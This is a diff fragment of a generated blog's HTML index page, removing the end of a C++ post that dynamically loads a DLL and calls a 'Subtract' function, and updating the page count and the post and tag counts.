fp2 = <span class="built_in">pSubtract</span>(<span class="built_in">GetProcAddress</span>(hDLL, <span class="string">&quot;Subtract&quot;</span>)); <span class="comment">//使用了externC，所以不用考虑C++修饰符</span></span><br><span class="line">        <span class="keyword">if</span> (fp2 != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="built_in">fp2</span>(<span class="number">5.5</span>, <span class="number">2.5</span>) &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;Cannot Find Function &quot;</span> &lt;&lt; <span class="string">&quot;Subtract&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">FreeLibrary</span>(hDLL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Cannot Find &quot;</span> &lt;&lt; <span class="string">&quot;Dll1.dll&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -1062,7 +1108,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">168</span>
+          <span class="site-state-item-count">172</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1074,7 +1120,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">60</span>
+        <span class="site-state-item-count">62</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
